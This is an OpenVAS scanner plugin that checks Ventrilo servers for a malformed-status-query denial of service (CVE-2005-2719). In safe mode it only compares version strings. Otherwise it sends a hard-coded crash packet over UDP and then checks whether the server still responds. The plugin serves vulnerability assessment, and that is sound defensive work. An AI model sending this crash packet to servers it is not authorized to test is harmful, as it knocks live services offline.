# OpenVAS Vulnerability Test
# $Id: ventrilo_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Ventrilo Server Malformed Status Query Remote DoS
#
# Authors:
# Josh Zlatin-Amishav and Boaz Shatz
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.19757");
  script_version("2019-04-10T13:42:28+0000");
  script_tag(name:"last_modification", value:"2019-04-10 13:42:28 +0000 (Wed, 10 Apr 2019)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_bugtraq_id(14644);
  script_cve_id("CVE-2005-2719");
  script_name("Ventrilo Server Malformed Status Query Remote DoS");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");
  script_family("Denial of Service");
  script_dependencies("ventrilo_detect.nasl");
  script_require_udp_ports("Services/udp/ventrilo", 3784);
  script_mandatory_keys("Ventrilo/version");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The remote Ventrilo service can be disabled remotely.");

  script_tag(name:"impact", value:"A malicious user can crash the remote version of Ventrilo due to a
  vulnerability in the way the server handles malformed status queries.");

  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0763.html");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("misc_func.inc");

version = get_kb_item("Ventrilo/version");
if(!version)
  exit(0);

port = get_port_for_service(default:3784, ipproto:"udp", proto:"ventrilo");

if(safe_checks()) {
  if(ereg(pattern:"^2\.(1\.[2-9]|2\.|3\.0($|[^0-9.]))", string:version)) {
    security_message(port:port);
    exit(0);
  }
  exit(99);
} else {
  # A packet to crash the server.
  pkt_dos = raw_string(0x4c,0xe3,0xdd,0x25,0xf2,0xa6,0xe7,0xb8,0x66,0x76,
                       0x22,0xf0,0xfd,0xba,0x01,0xc9,0xef,0x15,0x5e,0x55);

  # A packet to request the server's status.
  pkt_status = raw_string(0x6f,0x03,0xae,0x41,0x77,0x87,0x7d,0x8c,0x65,
                          0xea,0x22,0x0b,0xf8,0xa2,0xbc,0x03,0xa5,0x0a,
			  0xf6,0xb0,0x36,0xe0,0x93,0xd0,0x4e,0x82,0x1b,
			  0xb8,0x19,0x6f,0x91,0x3a,0x7f,0x04,0xe7,0x07);

  tries = 5;
  for(iter = 0; iter < tries; iter++) {
    soc = open_sock_udp(port);
    if(!soc)
      continue;
    send(socket:soc, data:pkt_dos);
    close(soc);
  }

  for(iter = 0; iter < tries; iter++) {
    soc = open_sock_udp(port);
    if(!soc)
      continue;
    send(socket:soc, data:pkt_status);

    buff = recv(socket:soc, length:512);
    close(soc);
    # A response to the status request means the server didn't crash.
    if(buff)
      exit(99);
    sleep(1);
  }

  # No response to the status request -- assume it's down.
  security_message(port:port);
  exit(0);
}